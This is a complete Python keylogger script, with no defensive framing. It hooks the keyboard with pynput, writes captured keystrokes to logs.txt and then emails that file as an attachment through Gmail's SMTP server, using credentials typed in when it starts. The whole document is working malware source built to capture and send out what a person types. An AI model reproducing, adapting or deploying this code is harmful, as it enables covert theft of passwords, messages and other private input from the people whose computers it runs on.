#!/usr/bin/python3 
# Written by Alsalt Alkharosi.

import pynput
from pynput.keyboard import Key,Listener
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders


count = 0
keys = []
email_address = input('Email address:')
password = input('Password:')

def press(key):
    global count,keys

    keys.append(key)
    count += 1

    print('{0} pressed'.format(key))

    if count >= 10:
        count = 0
        write_file(str(keys))
        keys = []

def write_file(keys):
    with open('logs.txt','a') as f:
        for key in keys:
            k = str(key).replace("'","")
            if k.find('space') > 0:
                f.write('\n')
            elif k.find('Key') == -1:
                f.write(k)

def release(key):
    if key == Key.esc:
        return False

def send_email():

    email_send = email_address
    email_password = password
    subject = 'Keylogger'

    msg = MIMEMultipart()
    msg['To'] = email_send
    msg['Subject'] = subject

    body = 'Here is the keylogger.'
    msg.attach(MIMEText(body,'plain'))

    filename = 'logs.txt'
    attachment = open(filename, 'rb')

    part = MIMEBase('application', 'octet-stream')
    part.set_payload((attachment).read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', "attachment; filename= "+filename)

    msg.attach(part)
    text = msg.as_string()
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(email_address, email_password)

    server.sendmail(email_send, email_send, text)
    server.quit()

def main():
    with Listener(on_press=press,on_release=release) as listener:
        listener.join()
        send_email()

if __name__=='__main__':
    main()
